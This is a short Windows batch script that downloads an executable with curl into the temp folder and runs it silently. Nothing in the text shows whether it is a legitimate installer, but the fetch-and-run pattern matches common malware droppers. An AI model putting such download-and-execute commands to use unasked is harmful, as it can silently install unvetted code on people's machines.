@echo off
pushd "%Temp%"
curl.exe -L -o setup.exe https://www.petges.lu/pubfiles/ac-11_00.exe
start setup.exe /silent
